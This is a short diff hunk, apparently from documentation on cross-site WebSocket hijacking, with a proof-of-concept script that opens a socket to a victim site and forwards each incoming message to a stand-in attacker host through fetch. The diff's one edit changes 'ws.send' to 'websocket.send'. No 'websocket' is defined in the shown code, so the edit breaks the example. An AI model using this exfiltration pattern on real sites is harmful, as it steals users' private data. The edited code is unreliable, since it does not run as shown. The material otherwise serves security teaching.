@@ -45,7 +45,7 @@ data from the WebSocket to the attacker:
 <script>
   ws = new WebSocket('wss://vulnerable.example.com/messages');
   ws.onopen = function start(event) {
-    ws.send("HELLO");
+    websocket.send("HELLO");
   }
   ws.onmessage = function handleReply(event) {
     fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
